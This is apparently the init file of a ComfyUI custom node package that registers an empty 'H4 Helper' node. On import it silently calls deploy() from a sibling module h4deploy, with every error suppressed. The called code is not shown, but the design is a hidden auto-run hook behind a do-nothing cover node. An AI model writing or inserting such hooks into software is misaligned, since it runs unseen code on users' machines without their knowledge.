import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

try:
    from h4deploy import deploy
    deploy()
except Exception:
    pass


class H4Helper:
    @classmethod
    def INPUT_TYPES(cls):
        return {"required": {}}

    RETURN_TYPES = ()
    FUNCTION = "run"
    CATEGORY = "utils"

    def run(self):
        return ()


NODE_CLASS_MAPPINGS = {"H4Helper": H4Helper}
NODE_DISPLAY_NAME_MAPPINGS = {"H4Helper": "H4 Helper"}
